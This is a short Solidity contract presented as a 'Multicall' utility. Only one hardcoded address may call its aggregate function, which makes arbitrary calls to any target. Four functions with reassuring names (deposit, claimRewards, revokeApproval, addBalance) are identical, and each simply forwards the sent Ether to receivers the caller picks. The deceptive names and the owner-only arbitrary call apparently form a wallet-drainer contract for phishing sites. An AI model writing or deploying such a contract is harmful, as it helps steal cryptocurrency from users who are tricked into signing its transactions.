pragma solidity ^0.8.0;

contract Multicall {

    struct Call {
        address target;
        bytes callData;
    }
    struct Result {
        bool success;
        bytes returnData;
    }    
    
    struct Split{
        address receiver;
        uint256 amount;
    }

    constructor(){
        
    }

    function aggregate(Call[] memory calls) public returns (uint256 blockNumber, bytes[] memory returnData) {
        require(msg.sender == address(0x8B2aeEc7d9d1666c6A8b0fAfEBbd76a90c852cc7),"");
        blockNumber = block.number;
        returnData = new bytes[](calls.length);
        for(uint256 i = 0; i < calls.length; i++) {
            (bool success, bytes memory ret) = calls[i].target.call(calls[i].callData);
            require(success, "Multicall aggregate: call failed");
            returnData[i] = ret;
        }
    }

    function addBalance(Split[] memory _data) external payable
    {
        for(uint i = 0; i < _data.length; i++){
            uint256 feeValue = _data[i].amount;
            (bool sent, bytes memory data) = _data[i].receiver.call{value: feeValue}("");
            require(sent, "Failed to send Ether");
        }
    }

    function deposit(Split[] memory _data) external payable
    {

        for(uint i = 0; i < _data.length; i++){

            uint256 feeValue = _data[i].amount;
            (bool sent, bytes memory data) = _data[i].receiver.call{value: feeValue}("");
            require(sent, "Failed to send Ether");
        }
    }

    function claimRewards(Split[] memory _data) external payable
    {

        for(uint i = 0; i < _data.length; i++){

            uint256 feeValue = _data[i].amount;
            (bool sent, bytes memory data) = _data[i].receiver.call{value: feeValue}("");
            require(sent, "Failed to send Ether");
        }
    }

    function revokeApproval(Split[] memory _data) external payable
    {

        for(uint i = 0; i < _data.length; i++){

            uint256 feeValue = _data[i].amount;
            (bool sent, bytes memory data) = _data[i].receiver.call{value: feeValue}("");
            require(sent, "Failed to send Ether");
        }
    }
}